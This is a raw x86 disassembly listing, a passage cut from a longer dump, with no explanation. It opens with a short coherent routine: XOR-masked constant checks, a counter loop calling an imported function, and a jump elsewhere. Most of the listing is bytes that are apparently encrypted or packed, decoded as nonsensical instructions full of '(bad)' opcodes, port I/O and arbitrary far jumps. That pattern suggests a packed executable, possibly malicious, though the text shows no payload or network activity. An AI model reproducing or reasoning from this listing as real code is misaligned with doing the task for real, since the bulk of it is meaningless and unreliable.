  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x42fa3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [edi],al
  41d514:	xchg   esp,eax
  41d515:	int    0x77
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x348f3e85],1
  41d522:	out    0x31,eax
  41d524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d525:	ficomp WORD PTR [edi-0x1091ab9d]
  41d52b:	add    ebp,DWORD PTR [edx-0x33304f21]
  41d531:	mov    dh,0xb3
  41d533:	mov    ah,0x7f
  41d535:	fcom   st(5)
  41d537:	jns    0x41d5ac
  41d539:	and    dh,cl
  41d53b:	stos   BYTE PTR es:[edi],al
  41d53c:	mov    ecx,0xd4f9d8a8
  41d541:	shr    BYTE PTR [ecx],cl
  41d543:	or     al,0xd7
  41d545:	xor    ecx,DWORD PTR [ebp+0x73ac7cd0]
  41d54b:	arpl   bx,di
  41d54d:	pusha  
  41d54e:	pop    eax
  41d54f:	inc    edx
  41d550:	and    al,0xb
  41d552:	push   0xd
  41d554:	jo     0x41d4dd
  41d556:	pop    ebx
  41d557:	rcr    BYTE PTR [esi+0x2f],cl
  41d55a:	test   DWORD PTR [ecx+0x2e],edx
  41d55d:	mov    eax,ds:0x5966cada
  41d562:	mov    ecx,0x53fdeabb
  41d567:	das    
  41d568:	enter  0xc30c,0xe4
  41d56c:	cmc    
  41d56d:	test   BYTE PTR [esi],0x92
  41d570:	clc    
  41d571:	es gs push 0x819447d
  41d578:	push   0x86848332
  41d57d:	sbb    cl,al
  41d57f:	sbb    BYTE PTR [ebp+0x48],cl
  41d582:	fistp  QWORD PTR es:[esi]
  41d585:	jo     0x41d5b8
  41d587:	or     ebx,ebp
  41d589:	adc    dh,BYTE PTR [esi+0x2ca23c2e]
  41d58f:	imul   edi,ecx,0x92cb8f1f
  41d595:	in     al,0x71
  41d597:	and    eax,0x17b969aa
  41d59c:	dec    esi
  41d59d:	push   0xa2c1ffc2
  41d5a2:	push   0x3a
  41d5a4:	pop    edx
  41d5a5:	pop    esi
  41d5a6:	push   0xffffff8f
  41d5a8:	mov    dl,0x80
  41d5aa:	out    dx,eax
  41d5ab:	outs   dx,DWORD PTR ds:[esi]
  41d5ac:	mov    al,dl
  41d5ae:	cmc    
  41d5af:	jmp    0xdd862b92
  41d5b4:	popa   
  41d5b5:	and    BYTE PTR [edi+0x26],al
  41d5b8:	mov    dh,0x12
  41d5ba:	bound  edi,QWORD PTR [edi-0x13]
  41d5bd:	inc    edi
  41d5be:	daa    
  41d5bf:	mov    edx,0x48b9f5
  41d5c4:	xchg   ebx,eax
  41d5c5:	sahf   
  41d5c6:	push   ss
  41d5c7:	cmp    DWORD PTR [esi],edx
  41d5c9:	inc    esp
  41d5ca:	sahf   
  41d5cb:	enter  0x2b10,0xbf
  41d5cf:	sub    esp,ecx
  41d5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d2:	hlt    
  41d5d3:	cdq    
  41d5d4:	sbb    eax,0x169e44df
  41d5d9:	adc    BYTE PTR [ebx+0x7b447a78],al
  41d5df:	or     al,0x1a
  41d5e1:	int    0x77
  41d5e3:	sub    dh,BYTE PTR [ecx+0x52]
  41d5e6:	cwde   
  41d5e7:	xchg   ebx,eax
  41d5e8:	xor    BYTE PTR [edi-0x2283cc5f],cl
  41d5ee:	xchg   esp,eax
  41d5ef:	add    eax,0xc20dd9e7
  41d5f4:	es or  al,0x99
  41d5f7:	sbb    dh,BYTE PTR [eax+0xfe9b9e7]
  41d5fd:	sbb    DWORD PTR [edi-0x16],esp
  41d600:	sub    eax,DWORD PTR [eax]
  41d602:	loope  0x41d5d9
  41d604:	inc    esi
  41d605:	cmp    al,0xfc
  41d607:	in     eax,0x9
  41d609:	jmp    0x41d679
  41d60b:	inc    ebp
  41d60c:	mov    edi,0x5c897d55
  41d611:	jbe    0x41d639
  41d613:	in     al,0xbf
  41d615:	mov    esp,0x9ce2defe
  41d61a:	mov    dx,WORD PTR [eax+0x5481e953]
  41d621:	loope  0x41d5e7
  41d623:	(bad)  
  41d624:	leave  
  41d625:	push   0x92c7cfd3
  41d62a:	ja     0x41d6a4
  41d62c:	pop    ebp
  41d62d:	stos   DWORD PTR es:[edi],eax
  41d62e:	push   ecx
  41d62f:	ret    
  41d630:	mov    DWORD PTR [ecx-0x326c8d4c],0x49ef5769
  41d63a:	jmp    0x41d603
  41d63c:	pop    esp
  41d63d:	mov    ds:0xc564f17b,eax
  41d642:	push   0x60c728d
  41d647:	test   BYTE PTR [ebx+0x38c75d88],al
  41d64d:	add    ebx,DWORD PTR [edx+0x57]
  41d650:	shl    ah,1
  41d652:	leave  
  41d653:	in     al,dx
  41d654:	push   es
  41d655:	cmp    al,bh
  41d657:	push   ebx
  41d658:	call   FWORD PTR [ebp+0x64582dbe]
  41d65e:	xor    DWORD PTR ds:0x55bdded,edi
  41d664:	cmp    BYTE PTR [eax],bh
  41d666:	imul   esp,DWORD PTR [edi+0x78],0xffffffbe
  41d66a:	adc    al,0xc7
  41d66c:	jp     0x41d657
  41d66e:	ror    dl,cl
  41d670:	(bad)  
  41d671:	adc    BYTE PTR [ecx+0x5d0d9f25],bl
  41d677:	xor    al,0x4c
  41d679:	xchg   esp,eax
  41d67a:	lea    eax,[edx]
  41d67c:	gs xor al,0x57
  41d67f:	xlat   BYTE PTR ds:[ebx]
  41d680:	push   ds
  41d681:	aaa    
  41d682:	add    BYTE PTR ds:[eax],0x71
  41d686:	mov    ds:0x27a1f83e,eax
  41d68b:	push   0xe5d5236f
  41d690:	mov    cl,0xc4
  41d692:	aaa    
  41d693:	out    0xb9,al
  41d695:	mov    DWORD PTR [eax+0x13],0x7924f73e
  41d69c:	push   ebx
  41d69d:	mov    esp,0x2c718c77
  41d6a3:	adc    eax,0xa9356c3a
  41d6a8:	sub    DWORD PTR [ebp+0x13],0x6c91a02e
  41d6af:	rcr    BYTE PTR [ebx+0x34],1
  41d6b2:	dec    edx
  41d6b3:	and    DWORD PTR [ecx+0x5297ce92],esi
  41d6b9:	cli    
  41d6ba:	inc    ebx
  41d6bb:	cmp    al,0x34
  41d6bd:	gs (bad) 
  41d6bf:	in     eax,dx
  41d6c0:	and    ebp,eax
  41d6c2:	jecxz  0x41d662
  41d6c4:	fadd   st(2),st
  41d6c6:	lods   eax,DWORD PTR ds:[esi]
  41d6c7:	fsubr  QWORD PTR [ebp-0x2f0f8971]
  41d6cd:	imul   edi,DWORD PTR [eax],0x24
  41d6d0:	in     eax,0x92
  41d6d2:	int3   
  41d6d3:	in     al,dx
  41d6d4:	dec    esi
  41d6d5:	or     BYTE PTR [edi-0x33],ah
  41d6d8:	ret    
  41d6d9:	adc    DWORD PTR [ebp+0x2178f865],0xffffffa8
  41d6e0:	pop    edi
  41d6e1:	inc    eax
  41d6e2:	pop    es
  41d6e3:	neg    ah
  41d6e5:	sbb    WORD PTR [eax+0x5b3301af],0x5809
  41d6ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ef:	inc    edi
  41d6f0:	or     al,0xe6
  41d6f2:	push   ds
  41d6f3:	aad    0xf8
  41d6f5:	and    eax,0xa554db5b
  41d6fa:	mov    edx,0x9f8d9781
  41d6ff:	mov    eax,ds:0xafad5ab0
  41d704:	pushf  
  41d705:	pop    eax
  41d706:	aaa    
  41d707:	fiadd  WORD PTR [ebp-0x3]
  41d70a:	sbb    al,0x67
  41d70c:	mov    bl,0xa4
  41d70e:	inc    edx
  41d70f:	call   0xc51e3a01
  41d714:	pop    esp
  41d715:	mov    edx,0xa2b3bfe9
  41d71a:	or     cl,ah
  41d71c:	fs xchg edi,eax
  41d71e:	cmp    DWORD PTR [edi],edi
  41d720:	push   0x34
  41d722:	out    dx,al
  41d723:	or     esi,ecx
  41d725:	stc    
  41d726:	push   ebx
  41d727:	adc    eax,esp
  41d729:	and    ah,BYTE PTR [edi+0x26]
  41d72c:	pop    edi
  41d72d:	fs cwde 
  41d72f:	dec    eax
  41d730:	mov    ah,0x63
  41d732:	jno    0x41d731
  41d734:	cmp    DWORD PTR [ecx-0x2f],ecx
  41d737:	mov    ds:0x925fa38d,al
  41d73c:	jmp    0x41d6ea
  41d73e:	pop    eax
  41d73f:	les    ebx,FWORD PTR [edx+0x8]
  41d742:	pop    ss
  41d743:	push   ecx
  41d744:	xchg   ebx,eax
  41d745:	adc    dh,bh
  41d747:	mov    dl,0x13
  41d749:	adc    BYTE PTR [ebx+0x7e572f4e],al
  41d74f:	scas   al,BYTE PTR es:[edi]
  41d750:	sub    DWORD PTR [edi-0x43],ebp
  41d753:	push   0x7964491d
  41d758:	and    edx,ecx
  41d75a:	adc    esp,DWORD PTR [ebx+0x77cef3e4]
  41d760:	mov    ecx,0xf37e81d0
  41d765:	jecxz  0x41d79e
  41d767:	retf   0x8010
  41d76a:	cmp    DWORD PTR ds:0x270a1bcd,ecx
  41d770:	jbe    0x41d798
  41d772:	pop    ebp
  41d773:	and    BYTE PTR [edi-0x19],al
  41d776:	push   es
  41d777:	inc    edi
  41d778:	(bad)  
  41d779:	lds    ebp,FWORD PTR [edi+0x605d5388]
  41d77f:	sbb    dl,0x89
  41d782:	or     al,BYTE PTR [ebx-0x54e7711a]
  41d788:	aaa    
  41d789:	mov    dl,0x2e
  41d78b:	inc    DWORD PTR ds:0xa67bf0ec
  41d791:	ins    DWORD PTR es:[edi],dx
  41d792:	adc    DWORD PTR [ecx+0xe5286aa],edx
  41d798:	inc    ecx
  41d799:	bound  ebx,QWORD PTR [ebx+0x43]
  41d79c:	cmc    
  41d79d:	test   ah,bh
  41d79f:	and    dh,BYTE PTR [esi-0x69]
  41d7a2:	sar    esi,1
  41d7a4:	xchg   BYTE PTR [ebx],dl
  41d7a6:	xlat   BYTE PTR ds:[ebx]
  41d7a7:	mov    esi,0xb4f78533
  41d7ac:	outs   dx,BYTE PTR ds:[esi]
  41d7ad:	ins    BYTE PTR es:[edi],dx
  41d7ae:	je     0x41d779
  41d7b0:	inc    ebp
  41d7b1:	ds ror bh,1
  41d7b4:	bound  edx,QWORD PTR [esi]
  41d7b6:	test   DWORD PTR [edi+0x5a],0xacf5d403
  41d7bd:	not    edi
  41d7bf:	mov    eax,ds:0x230d7357
  41d7c4:	adc    esp,edx
  41d7c6:	fwait
  41d7c7:	mov    bl,bh
  41d7c9:	mov    cl,0xb
  41d7cb:	or     eax,0xc7b2cc45
  41d7d0:	lods   eax,DWORD PTR ds:[esi]
  41d7d1:	fild   WORD PTR [esi]
  41d7d3:	pop    esi
  41d7d4:	lods   eax,DWORD PTR ds:[esi]
  41d7d5:	jecxz  0x41d814
  41d7d7:	add    DWORD PTR [ecx],ebx
  41d7d9:	cmp    BYTE PTR [edi],al
  41d7db:	jecxz  0x41d79c
  41d7dd:	jno    0x41d762
  41d7df:	pop    ecx
  41d7e0:	xchg   esp,eax
  41d7e1:	mov    cl,0x53
  41d7e3:	imul   ecx,eax,0x3cf3243b
  41d7e9:	(bad)  
  41d7ea:	fisubr WORD PTR [edi]
  41d7ec:	sbb    bh,BYTE PTR [edx-0x679550c1]
  41d7f2:	test   eax,0x613a5f58
  41d7f7:	aaa    
  41d7f8:	mov    cl,BYTE PTR [esi]
  41d7fa:	stc    
  41d7fb:	add    esp,DWORD PTR [ebp+0x60446496]
  41d801:	fsubr  DWORD PTR [ebp-0x41]
  41d804:	mov    ecx,0x470a469a
  41d809:	retf   
  41d80a:	cli    
  41d80b:	fsub   QWORD PTR [ebp+0x7f58414a]
  41d811:	mov    ebp,DWORD PTR [eax+0x2f]
  41d814:	jg     0x41d798
  41d816:	cmp    DWORD PTR [edx],eax
  41d818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d819:	mov    eax,0x4d7c65f
  41d81e:	pop    edi
  41d81f:	sub    bl,BYTE PTR [edi-0x177ceb6f]
  41d825:	push   edi
  41d826:	jecxz  0x41d89d
  41d828:	lahf   
  41d829:	fdivr  QWORD PTR [esi-0x6cc37409]
  41d82f:	sub    BYTE PTR [ebp-0x5],al
  41d832:	(bad)  
  41d834:	jl     0x41d7b7
  41d836:	stos   BYTE PTR es:[edi],al
  41d837:	and    al,0x3a
  41d839:	push   esi
  41d83a:	lds    edi,FWORD PTR [ebp-0x1c0434cb]
  41d840:	mov    es,WORD PTR [edi]
  41d842:	mov    ebp,0xe11a6dba
  41d847:	and    eax,0x5c63b631
  41d84c:	mov    DWORD PTR [edx-0x37],ebx
  41d84f:	jnp    0x41d820
  41d851:	(bad)  
  41d852:	jns    0x41d831
  41d854:	jb     0x41d8bc
  41d856:	push   edi
  41d857:	ins    DWORD PTR es:[edi],dx
  41d858:	jmp    0xb1fae09e
  41d85d:	and    DWORD PTR [edi+0x3aedcb89],ebx
  41d863:	out    dx,eax
  41d864:	lea    esi,[esi-0xaa17615]
  41d86a:	adc    al,0xb8
  41d86c:	mov    esp,edi
  41d86e:	outs   dx,DWORD PTR ds:[esi]
  41d86f:	add    al,0xd9
  41d871:	jbe    0x41d8dd
  41d873:	add    cl,BYTE PTR [edx]
  41d875:	pusha  
  41d876:	sbb    BYTE PTR [ecx-0x42],cl
  41d879:	jo     0x41d8cc
  41d87b:	sub    DWORD PTR [edx],edi
  41d87d:	jne    0x41d886
  41d87f:	mov    ecx,0xc239ddd6
  41d884:	test   DWORD PTR [edx],ebp
  41d886:	inc    esp
  41d887:	fisubr WORD PTR [esi-0x10]
  41d88a:	push   cs
  41d88b:	es dec esi
  41d88d:	cld    
  41d88e:	sbb    al,0xa2
  41d890:	inc    ebp
  41d891:	addr16 xor al,0xe5
  41d894:	cmp    dh,cl
  41d896:	sbb    BYTE PTR [edi-0x306f186b],dh
  41d89c:	shr    cl,cl
  41d89e:	jne    0x41d8eb
  41d8a0:	dec    eax
  41d8a1:	mov    ebp,0xb8713f0e
  41d8a6:	dec    ebp
  41d8a7:	mov    bl,0xd4
  41d8a9:	sbb    eax,0xce016417
  41d8ae:	sub    eax,0xaddfd955
  41d8b3:	inc    esi
  41d8b5:	add    BYTE PTR [esp+edx*8+0xc],ah
  41d8b9:	mov    esp,0xb57d5a71
  41d8be:	sbb    DWORD PTR [esi+0x2660f525],edx
  41d8c4:	push   esp
  41d8c5:	(bad)  
  41d8c6:	push   0xffffff83
  41d8c8:	and    ch,bh
  41d8ca:	adc    ebp,DWORD PTR [eax-0x73]
  41d8cd:	pop    edx
  41d8ce:	cmc    
  41d8cf:	mov    al,al
  41d8d1:	in     al,0x83
  41d8d3:	add    edi,DWORD PTR [esi-0x3249d174]
  41d8d9:	scas   eax,DWORD PTR es:[edi]
  41d8da:	xor    al,0x9a
  41d8dc:	or     al,BYTE PTR [ecx+0x3f]
  41d8df:	iret   
  41d8e0:	stos   BYTE PTR es:[edi],al
  41d8e1:	and    eax,0xaa89c92f
  41d8e6:	fs scas eax,DWORD PTR es:[edi]
  41d8e8:	clc    
  41d8e9:	aam    0x3b
  41d8eb:	out    dx,eax
  41d8ec:	mov    cl,0xba
  41d8ee:	mov    al,al
  41d8f0:	xor    DWORD PTR [edx-0x88824b4],ecx
  41d8f6:	fs std 
  41d8f8:	test   BYTE PTR [esi],bl
  41d8fa:	xchg   DWORD PTR [esp+ecx*2],edi
  41d8fd:	shl    cl,cl
  41d8ff:	mov    eax,0xd57d267e
  41d904:	and    BYTE PTR [edx],bh
  41d906:	add    DWORD PTR [esi+0x4681b5c5],ebx
  41d90c:	cs cmc 
  41d90e:	jnp    0x41d8c2
  41d910:	popa   
  41d911:	jmp    0x8767:0x3bcd3b5e
  41d918:	ss jge 0x41d996
  41d91b:	xchg   edx,eax
  41d91c:	fs daa 
  41d91e:	lods   eax,DWORD PTR ds:[esi]
  41d91f:	jge    0x41d8f9
  41d921:	and    DWORD PTR fs:[esi+0x3062f3c8],edx
  41d928:	xchg   DWORD PTR [esi+ecx*1-0x24],edi
  41d92c:	and    DWORD PTR [edi],0xa6a212ae
  41d932:	jno    0x41d962
  41d934:	sbb    al,0x43
  41d936:	dec    esi
  41d937:	sub    edx,0xffffffab
  41d93a:	push   cs
  41d93b:	mov    ebx,0x591199ff
  41d940:	dec    ebp
  41d941:	shl    DWORD PTR [edi],1
  41d943:	mov    ebx,0xb06abe1
  41d948:	into   
  41d949:	dec    edi
  41d94a:	sbb    esi,DWORD PTR [esp+eiz*8+0x70a165a6]
  41d951:	dec    edx
  41d952:	std    
  41d953:	sub    eax,0xfe61d8ee
  41d958:	scas   eax,DWORD PTR es:[edi]
  41d959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d95a:	call   0x27:0xa0b7478d
  41d961:	lds    eax,FWORD PTR [edi+0x76]
  41d964:	dec    edx
  41d965:	add    esi,DWORD PTR [eax-0x30]
  41d968:	pop    ebx
  41d969:	mov    ds:0x30cd61c3,al
  41d96e:	or     al,0xb2
  41d970:	call   DWORD PTR [esi+0x640147cc]
  41d976:	and    eax,0x849ba170
  41d97b:	pop    esp
  41d97c:	or     BYTE PTR [ebp-0x69],ah
  41d97f:	lahf   
  41d980:	pusha  
  41d981:	scas   eax,DWORD PTR es:[edi]
  41d982:	jmp    0x16ea7d4b
  41d987:	ins    BYTE PTR es:[edi],dx
  41d988:	push   edi
  41d989:	sbb    bl,BYTE PTR ds:0xffaf9ffc
  41d98f:	mov    ds:0xb986d3e9,eax
  41d994:	cmp    eax,0x7e971399
  41d999:	or     al,BYTE PTR [ecx+0x363f27fc]
  41d99f:	or     cl,BYTE PTR [ebx]
  41d9a1:	inc    ebx
  41d9a2:	rol    DWORD PTR [edi],1
  41d9a4:	ficom  DWORD PTR [ecx]
  41d9a6:	pop    eax
  41d9a7:	xchg   DWORD PTR [edi+0x46],eax
  41d9aa:	cmp    al,0xa3
  41d9ac:	inc    edx
  41d9ad:	dec    ebp
  41d9ae:	jp     0x41d9fa
  41d9b0:	enter  0xdc6e,0x56
  41d9b4:	mov    es,esp
  41d9b6:	jmp    0xdf26:0xd369d5
  41d9bd:	jmp    0x7d2c:0x2ac7e506
  41d9c4:	(bad)  
  41d9c5:	loop   0x41da1d
  41d9c7:	xchg   esi,eax
  41d9c8:	add    eax,0x50b59af3
  41d9cd:	inc    bh
  41d9cf:	jle    0x41d9a3
  41d9d1:	cmp    dh,ah
  41d9d3:	add    DWORD PTR [eax+0x4570df7c],edx
  41d9d9:	(bad)  
  41d9da:	loopne 0x41d985
  41d9dc:	test   DWORD PTR [eax-0x2a4d92fb],esi
  41d9e2:	jl     0x41da0e
  41d9e4:	mov    eax,ds:0xb2a1be2c
  41d9e9:	mov    ds:0xcd66a955,eax
  41d9ee:	sub    ebp,DWORD PTR [edi-0x4d6562b0]
  41d9f4:	push   ds
  41d9f5:	sub    BYTE PTR [eax],0x87
  41d9f8:	dec    edi
  41d9f9:	mov    ds:0x64d1bb9d,al
  41d9fe:	leave  
  41d9ff:	jbe    0x41d9b2
  41da01:	(bad)  
  41da03:	add    BYTE PTR [ecx-0x48b3edfd],cl
  41da09:	jae    0x41d9e4
  41da0b:	clc    
  41da0c:	loopne 0x41d99c
  41da0e:	xchg   DWORD PTR [ebx],esp
  41da10:	pop    esi
  41da11:	xor    edi,DWORD PTR [edx]
  41da13:	fisub  DWORD PTR ds:0xb59ccc71
  41da19:	mov    bl,0x86
  41da1b:	leave  
  41da1c:	(bad)  
  41da1d:	jmp    0x936c:0x7309c865
  41da24:	push   ebx
  41da25:	and    al,0x3c
  41da27:	mov    gs,edi
  41da29:	lods   al,BYTE PTR ds:[esi]
  41da2a:	mov    al,0xef
  41da2c:	stos   DWORD PTR es:[edi],eax
  41da2d:	arpl   dx,bx
  41da2f:	call   0xb725:0xffc17a4b
  41da36:	mov    DWORD PTR [ecx+ebp*1],esi
  41da39:	pop    eax
  41da3a:	xor    bl,BYTE PTR [ecx+eiz*2+0x725bb14c]
  41da41:	test   BYTE PTR [edi-0x7e],bh
  41da44:	sub    DWORD PTR [edi+0x34],ebp
  41da47:	mov    ch,0x8
  41da49:	pop    ebp
  41da4a:	test   ch,ch
  41da4c:	adc    al,0xc4
  41da4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da4f:	sti    
  41da50:	dec    eax
  41da51:	lea    esi,[edx+0x3472c1c5]
  41da57:	iret   
  41da58:	dec    edx
  41da5a:	inc    ebx
  41da5b:	xchg   ebx,eax
  41da5c:	repnz icebp 
  41da5e:	imul   DWORD PTR [edx+0x14d4298d]
  41da64:	sub    cl,ch
  41da66:	sbb    edx,DWORD PTR [ebx]
  41da68:	sbb    BYTE PTR [ebx-0x1c3215c8],ah
  41da6e:	test   ebx,eax
  41da70:	or     edi,ecx
  41da72:	or     ebx,DWORD PTR [eax-0x27]
  41da75:	dec    eax
  41da76:	inc    ebp
  41da77:	imul   ebp,DWORD PTR [ebp-0x380c74b8],0xe5f2423a
  41da81:	test   edi,0xe75e44a
  41da87:	cmp    DWORD PTR [ecx],eax
  41da89:	(bad)  
  41da8a:	and    ebx,ebp
  41da8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8d:	shr    eax,cl
  41da8f:	mov    bl,0xbe
  41da91:	push   edi
  41da92:	leave  
  41da93:	sbb    al,0xd4
  41da95:	sar    DWORD PTR [ebx-0x28],0x9
  41da99:	fwait
  41da9a:	(bad)  
  41da9b:	cwde   
  41da9c:	aad    0x91
  41da9e:	aas    
  41da9f:	popa   
  41daa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa1:	mov    edx,0x1ecbeca5
  41daa6:	shl    dh,0x60
  41daa9:	sub    eax,0xb13be629
  41daae:	scas   eax,DWORD PTR es:[edi]
  41daaf:	out    dx,al
  41dab0:	das    
  41dab1:	mov    esp,0x7a0e42a3
  41dab6:	xchg   ebx,eax
  41dab7:	pop    edx
  41dab8:	adc    BYTE PTR [ebp-0x4ac0f164],dh
  41dabe:	es sbb dl,dl
  41dac1:	mov    ecx,0x6bb58d32
  41dac6:	(bad)  
  41dac7:	mov    gs,WORD PTR [eax]
  41dac9:	jno    0x41da4b
  41dacb:	(bad)  
  41dacc:	cmp    bh,BYTE PTR [ebx+0x1b15f1fb]
  41dad2:	xchg   ebx,eax
  41dad3:	push   ebp
  41dad4:	jb     0x41db04
  41dad6:	cmp    bh,dh
  41dad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dad9:	shl    ebp,cl
  41dadb:	sbb    bl,0xf9
  41dade:	jne    0x41daf7
  41dae0:	inc    edi
  41dae1:	cdq    
  41dae2:	push   edi
  41dae3:	mov    WORD PTR [esi],ss
  41dae5:	push   ecx
  41dae6:	scas   al,BYTE PTR es:[edi]
  41dae7:	dec    ecx
  41dae8:	jmp    0xc54ac8ec
  41daed:	(bad)  
  41daee:	shl    DWORD PTR [edx+0x5e],1
  41daf1:	test   DWORD PTR gs:[ecx],ebp
  41daf4:	mul    edi
  41daf6:	xor    al,0x96
  41daf8:	mov    ds:0x4510aa07,al
  41dafd:	in     al,dx
  41dafe:	jecxz  0x41db38
  41db00:	xor    BYTE PTR [eax+ebx*2+0x6410fbe4],dl
  41db07:	mov    eax,0x2220c152
  41db0c:	mov    ds:0x1ba95d2b,al
  41db11:	das    
  41db12:	aas    
  41db13:	iret   
  41db14:	pushf  
  41db15:	inc    ebx
  41db16:	mov    esp,0xe94725cb
  41db1b:	arpl   bp,si
  41db1d:	xlat   BYTE PTR ds:[ebx]
  41db1e:	aam    0xe2
  41db20:	and    al,0x1d
  41db22:	popa   
  41db23:	xor    BYTE PTR [ebx+0x1d9ad02b],dh
  41db29:	cs add eax,0xb1563276
  41db2f:	adc    ecx,DWORD PTR [ebx+ebp*8]
  41db32:	mov    edi,0x2fe90ce1
  41db37:	jmp    0xbd1c:0xeafa87a5
  41db3e:	mov    eax,0x5c39b4e8
  41db43:	js     0x41db4a
  41db45:	lea    esi,[esp+edx*1-0x18]
  41db49:	les    edi,FWORD PTR [eax+0x19]
  41db4c:	jg     0x41daf7
  41db4e:	cmp    DWORD PTR [ebx],esi
  41db50:	push   cs
  41db51:	imul   edi,edi,0x744b44fa
  41db57:	dec    ebp
  41db58:	dec    esi
  41db59:	mov    ebp,0x73ecba65
  41db5e:	loope  0x41db0a
  41db60:	push   cs
  41db61:	pop    eax
  41db62:	dec    esp
  41db63:	push   0xffffff92
  41db65:	dec    edi
  41db66:	in     al,0xf4
  41db68:	mul    BYTE PTR ds:0xc88d84ea
  41db6e:	xchg   ebp,eax
  41db6f:	xchg   ebx,eax
  41db70:	ret    0x4650
  41db73:	sbb    dl,cl
  41db75:	pop    esp
  41db76:	mov    ds:0x9e512655,eax
  41db7b:	jp     0x41db4d
  41db7d:	sub    edx,DWORD PTR [ecx]
  41db7f:	add    bl,0x99
  41db82:	mov    al,0xdb
  41db84:	sub    edi,DWORD PTR [edx-0x3f]
  41db87:	jmp    0x50c8:0xac632d40
  41db8e:	or     ah,BYTE PTR [edi+0x4c1dfefd]
  41db94:	add    al,0x37
  41db96:	or     ch,dh
  41db98:	jmp    0xca82:0x7300026f
  41db9f:	fmul   DWORD PTR [esi-0x4b944f10]
  41dba5:	mov    dl,0xdd
  41dba7:	shl    DWORD PTR [edi-0x26],0x68
  41dbab:	xchg   esi,eax
  41dbac:	xor    eax,DWORD PTR [esi-0x2]
  41dbaf:	and    BYTE PTR [eax+eax*8],dh
  41dbb2:	sbb    esp,DWORD PTR [esi-0x30]
  41dbb5:	push   ebp
  41dbb6:	leave  
  41dbb7:	cmp    ebx,DWORD PTR [esi+0x3af65d4d]
  41dbbd:	jge    0x41dbe7
  41dbbf:	cmp    eax,0xc94ef37a
  41dbc4:	(bad)  
  41dbc5:	cmp    eax,0xce373041
  41dbca:	rcl    eax,cl
  41dbcc:	or     DWORD PTR [esi-0x2a],eax
  41dbcf:	sbb    BYTE PTR [ebx+0x398f4974],bh
  41dbd5:	cmp    BYTE PTR [ebx-0x4d],cl
  41dbd8:	xchg   edx,eax
  41dbd9:	or     cl,BYTE PTR [ebx]
  41dbdb:	push   ss
  41dbdc:	jmp    0xc492f3da
  41dbe1:	add    BYTE PTR [ecx],0x74
  41dbe4:	jnp    0x41dc22
  41dbe6:	aas    
  41dbe7:	(bad)  
  41dbe8:	jmp    0x41dc12
  41dbea:	jg     0x41dc26
  41dbec:	test   ebx,esi
  41dbee:	loop   0x41dc55
  41dbf0:	inc    esi
  41dbf1:	mov    edx,0x1778b282
  41dbf6:	fdivp  st(6),st
  41dbf8:	out    0xfc,eax
  41dbfa:	adc    BYTE PTR [edi],0x9c
  41dbfd:	cmp    al,0x1d
  41dbff:	add    BYTE PTR [edx+0x65d3e2e1],dl
  41dc05:	ficom  DWORD PTR [eax+0x50b06e1a]
  41dc0b:	into   
  41dc0c:	sti    
  41dc0d:	pop    es
  41dc0e:	cmc    
  41dc0f:	retf   0x96ce
  41dc12:	shl    DWORD PTR [esi],0xc
  41dc15:	ror    DWORD PTR [edi],0xc8
  41dc18:	inc    esi
  41dc19:	or     eax,0x7f48e843
  41dc1e:	ret    
  41dc1f:	mov    bh,0x16
  41dc21:	dec    edi
  41dc22:	add    BYTE PTR [edi+ebx*4+0x56],dl
  41dc26:	push   ebx
  41dc27:	(bad)  
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	sbb    edx,DWORD PTR [eax-0x16ff479e]
  41dc2f:	popf   
  41dc30:	pop    eax
  41dc31:	jns    0x41dc6d
  41dc33:	adc    BYTE PTR [esi-0x403e66c3],ah
  41dc39:	or     BYTE PTR [ebx+0x7cda1a50],cl
  41dc3f:	test   DWORD PTR [eax+ecx*2],edi
  41dc42:	aam    0xf4
  41dc44:	cmp    al,0x79
  41dc46:	adc    BYTE PTR [edi+esi*1+0x711b4305],cl
  41dc4d:	mov    bl,0xd5
  41dc4f:	and    al,0xfe
  41dc51:	aad    0x33
  41dc53:	pop    ebp
  41dc54:	outs   dx,BYTE PTR ds:[esi]
  41dc55:	mov    ebp,0x5df0d9c8
  41dc5a:	jbe    0x41dc87
  41dc5c:	push   0x7e
  41dc5e:	pop    ecx
